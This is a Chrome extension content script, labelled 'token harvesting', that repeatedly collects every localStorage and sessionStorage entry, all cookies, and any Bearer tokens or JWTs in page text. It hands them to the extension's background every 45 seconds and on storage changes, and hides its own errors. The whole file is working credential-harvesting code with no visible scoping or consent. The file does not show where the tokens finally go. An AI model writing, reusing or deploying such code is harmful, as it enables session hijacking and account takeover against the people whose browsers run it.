// content.js: token harvesting
(function () {
  let intervalId = null;

  /**
   * Returns true if the extension context is still valid.
   * After the extension reloads / updates, chrome.runtime becomes
   * unavailable in previously-injected content scripts.
   */
  function isContextValid() {
    try {
      return !!chrome.runtime?.id;
    } catch {
      return false;
    }
  }

  /**
   * Self-destruct: clear the interval and remove the storage listener
   * so this orphaned content script stops running entirely.
   */
  function teardown() {
    if (intervalId !== null) {
      clearInterval(intervalId);
      intervalId = null;
    }
    window.removeEventListener('storage', collectTokens);
  }

  function collectTokens() {
    // If the extension was reloaded, clean up and stop.
    if (!isContextValid()) {
      teardown();
      return;
    }

    try {
      const keys = [
        ...Object.entries(localStorage).map(([k, v]) => ({ type: 'localStorage', key: k, value: v })),
        ...Object.entries(sessionStorage).map(([k, v]) => ({ type: 'sessionStorage', key: k, value: v })),
        ...document.cookie.split(';').filter(Boolean).map((pair) => {
          const [key, value] = pair.trim().split('=');
          return { type: 'cookie', key, value };
        })
      ];

      // Scan page text for Bearer tokens and JWTs (using body.textContent is
      // much cheaper than querySelectorAll('*') which walks every DOM node).
      const bodyText = document.body?.textContent || '';

      const bearerMatches = bodyText.match(/Bearer\s+([A-Za-z0-9\-._~+/]+=*)/g) || [];
      const bearerTokens = bearerMatches.map((m) => ({
        type: 'bearer',
        value: m.replace(/^Bearer\s+/, '')
      }));

      const jwtReg = /eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g;
      const jwtMatches = bodyText.match(jwtReg) || [];
      const jwtTokens = jwtMatches.map((j) => ({ type: 'jwt', value: j }));

      const tokens = [...keys, ...bearerTokens, ...jwtTokens].filter((v) => v && v.value);

      if (tokens.length > 0) {
        chrome.runtime.sendMessage({ type: 'saveTokens', tokens }, () => {
          // Swallow any "Extension context invalidated" error that fires
          // between our isContextValid() check and the actual sendMessage.
          if (chrome.runtime.lastError) {
            teardown();
          }
        });
      }
    } catch (err) {
      // If anything goes wrong (invalidated context, security policy, etc.)
      // clean up silently rather than spamming the console.
      if (!isContextValid()) {
        teardown();
      }
    }
  }

  collectTokens();
  window.addEventListener('storage', collectTokens);
  intervalId = setInterval(collectTokens, 45000);
})();
